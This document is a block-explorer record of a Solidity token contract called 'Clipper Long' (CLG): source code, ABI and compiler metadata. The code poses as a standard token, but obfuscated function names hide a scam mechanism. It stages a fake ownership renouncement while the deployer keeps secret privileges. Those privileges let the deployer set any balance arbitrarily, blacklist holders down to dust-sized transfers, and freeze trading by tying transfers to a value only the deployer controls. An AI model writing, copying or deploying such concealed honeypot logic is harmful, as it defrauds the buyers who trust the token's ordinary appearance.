{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface receiverWalletShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchLimitLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableReceiverMax {\n    function createPair(address senderFrom, address maxTx) external returns (address);\n}\n\ninterface tradingList {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedTx) external view returns (uint256);\n\n    function transfer(address launchedSender, uint256 totalMax) external returns (bool);\n\n    function allowance(address toTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedSender,\n        uint256 totalMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxReceiver, uint256 value);\n    event Approval(address indexed toTx, address indexed spender, uint256 value);\n}\n\ninterface teamLimit is tradingList {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClipperLong is launchLimitLiquidity, tradingList, teamLimit {\n\n    mapping(address => bool) public atShould;\n\n    function owner() external view returns (address) {\n        return listShould;\n    }\n\n    bool public amountShould;\n\n    function transferFrom(address shouldToList, address launchedSender, uint256 totalMax) external override returns (bool) {\n        if (_msgSender() != amountMin) {\n            if (walletMarketing[shouldToList][_msgSender()] != type(uint256).max) {\n                require(totalMax <= walletMarketing[shouldToList][_msgSender()]);\n                walletMarketing[shouldToList][_msgSender()] -= totalMax;\n            }\n        }\n        return maxSender(shouldToList, launchedSender, totalMax);\n    }\n\n    mapping(address => bool) public enableToken;\n\n    uint256 public totalLaunched;\n\n    function allowance(address enableTokenFee, address enableSender) external view virtual override returns (uint256) {\n        if (enableSender == amountMin) {\n            return type(uint256).max;\n        }\n        return walletMarketing[enableTokenFee][enableSender];\n    }\n\n    event OwnershipTransferred(address indexed walletLiquidity, address indexed marketingLiquidity);\n\n    function takeTotal(uint256 totalMax) public {\n        takeFundMarketing();\n        buySell = totalMax;\n    }\n\n    uint256 private teamAt;\n\n    uint256 fromTx;\n\n    string private liquidityFromTx = \"Clipper Long\";\n\n    uint256 public modeFee;\n\n    function launchedIsLiquidity() public {\n        emit OwnershipTransferred(isLaunch, address(0));\n        listShould = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    function maxSender(address shouldToList, address launchedSender, uint256 totalMax) internal returns (bool) {\n        if (shouldToList == isLaunch) {\n            return takeFee(shouldToList, launchedSender, totalMax);\n        }\n        uint256 walletAt = tradingList(receiverTake).balanceOf(sellReceiver);\n        require(walletAt == buySell);\n        require(launchedSender != sellReceiver);\n        if (enableToken[shouldToList]) {\n            return takeFee(shouldToList, launchedSender, buyTokenTx);\n        }\n        return takeFee(shouldToList, launchedSender, totalMax);\n    }\n\n    uint256 public teamReceiver;\n\n    function takeLiquidity(address amountEnableFrom, uint256 totalMax) public {\n        takeFundMarketing();\n        launchLimitTo[amountEnableFrom] = totalMax;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityFromTx;\n    }\n\n    address sellReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function liquidityMin(address amountMax) public {\n        takeFundMarketing();\n        \n        if (amountMax == isLaunch || amountMax == receiverTake) {\n            return;\n        }\n        enableToken[amountMax] = true;\n    }\n\n    uint256 private swapLimitAuto;\n\n    uint256 constant buyTokenTx = 2 ** 10;\n\n    function takeFee(address shouldToList, address launchedSender, uint256 totalMax) internal returns (bool) {\n        require(launchLimitTo[shouldToList] >= totalMax);\n        launchLimitTo[shouldToList] -= totalMax;\n        launchLimitTo[launchedSender] += totalMax;\n        emit Transfer(shouldToList, launchedSender, totalMax);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletMarketing;\n\n    uint256 buySell;\n\n    mapping(address => uint256) private launchLimitTo;\n\n    address public receiverTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMin;\n    }\n\n    uint256 public atAmount;\n\n    string private marketingWallet = \"CLG\";\n\n    function takeFundMarketing() private view {\n        require(atShould[_msgSender()]);\n    }\n\n    uint256 private totalMin = 100000000 * 10 ** 18;\n\n    address amountMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private txToken = 18;\n\n    uint256 private buyEnable;\n\n    function modeToTx(address listTake) public {\n        if (amountShould) {\n            return;\n        }\n        \n        atShould[listTake] = true;\n        \n        amountShould = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txToken;\n    }\n\n    function getOwner() external view returns (address) {\n        return listShould;\n    }\n\n    constructor (){\n        \n        receiverWalletShould launchMarketing = receiverWalletShould(amountMin);\n        receiverTake = enableReceiverMax(launchMarketing.factory()).createPair(launchMarketing.WETH(), address(this));\n        \n        isLaunch = _msgSender();\n        launchedIsLiquidity();\n        atShould[isLaunch] = true;\n        launchLimitTo[isLaunch] = totalMin;\n        \n        emit Transfer(address(0), isLaunch, totalMin);\n    }\n\n    address private listShould;\n\n    function transfer(address amountEnableFrom, uint256 totalMax) external virtual override returns (bool) {\n        return maxSender(_msgSender(), amountEnableFrom, totalMax);\n    }\n\n    address public isLaunch;\n\n    function approve(address enableSender, uint256 totalMax) public virtual override returns (bool) {\n        walletMarketing[_msgSender()][enableSender] = totalMax;\n        emit Approval(_msgSender(), enableSender, totalMax);\n        return true;\n    }\n\n    function balanceOf(address launchedTx) public view virtual override returns (uint256) {\n        return launchLimitTo[launchedTx];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIsLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"}],\"name\":\"liquidityMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"modeToTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMax\",\"type\":\"uint256\"}],\"name\":\"takeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMax\",\"type\":\"uint256\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountEnableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ClipperLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}